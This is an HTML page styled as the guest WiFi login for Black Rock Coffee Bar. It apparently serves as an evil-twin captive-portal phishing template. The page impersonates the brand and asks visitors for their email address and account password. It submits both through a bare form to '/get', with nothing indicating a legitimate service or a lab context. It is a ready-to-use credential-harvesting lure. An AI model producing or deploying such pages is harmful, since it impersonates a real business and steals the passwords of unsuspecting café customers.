<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Black Rock Coffee WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#111;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:400px;background:#111;border:1px solid #1e1e1e;border-radius:12px;overflow:hidden;box-shadow:0 16px 50px rgba(0,0,0,0.7)}
.top{padding:28px 24px 20px;text-align:center;border-bottom:1px solid #1e1e1e}
.rock{font-size:11px;font-weight:700;color:#555;letter-spacing:4px;text-transform:uppercase;margin-bottom:6px}
.brand{font-size:28px;font-weight:900;color:#fff;letter-spacing:1px;text-transform:uppercase}
.brand span{color:#CC0000}
.tagline{font-size:9px;color:#444;letter-spacing:2.5px;text-transform:uppercase;margin-top:6px}
.mid{background:#0a0a0a;border-bottom:1px solid #1e1e1e;padding:8px 24px;display:flex;align-items:center;gap:8px}
.dot{width:6px;height:6px;background:#CC0000;border-radius:50%;flex-shrink:0;box-shadow:0 0 0 3px rgba(204,0,0,0.2)}
.mid span{font-size:11px;color:#444}
.mid strong{color:#888}
.body{padding:24px}
h2{font-size:17px;font-weight:800;color:#e0e0e0;margin-bottom:3px}
.sub{font-size:12.5px;color:#555;margin-bottom:4px}
.lbl{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:#555;margin-bottom:6px;margin-top:18px}
input{width:100%;padding:12px 14px;border:1px solid #1e1e1e;border-radius:6px;font-size:14.5px;background:#0a0a0a;color:#e0e0e0;font-family:inherit}
input:focus{outline:none;border-color:#CC0000}
input::placeholder{color:#2a2a2a}
.btn{width:100%;padding:13px;margin-top:20px;border:none;border-radius:6px;background:#CC0000;color:#fff;font-size:13px;font-weight:800;letter-spacing:0.5px;cursor:pointer}
.terms{font-size:11px;color:#333;text-align:center;margin-top:12px;line-height:1.6}
.terms a{color:#CC0000}
.foot{background:#0a0a0a;border-top:1px solid #1e1e1e;padding:11px 24px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:10.5px;color:#333;text-decoration:none}
.foot a{color:#CC0000}
</style>
</head>
<body>
<div class="card">
  <div class="top">
    <div class="rock">Black Rock</div>
    <div class="brand">COFFEE<span> BAR</span></div>
    <div class="tagline">Fueling The Pursuit</div>
  </div>
  <div class="mid"><div class="dot"></div><span>Network: <strong>BlackRock_WiFi</strong></span></div>
  <div class="body">
    <h2>Guest WiFi</h2>
    <p class="sub">Sign in with your Black Rock account to connect.</p>
    <form action="/get">
      <label class="lbl">Email Address</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <button type="submit" class="btn">Connect Now →</button>
      <p class="terms">By connecting you agree to our <a href="#">Terms of Use</a>.</p>
    </form>
  </div>
  <div class="foot"><span>&copy; Black Rock Coffee Bar</span><a href="#">Help</a></div>
</div>
</body>
</html>
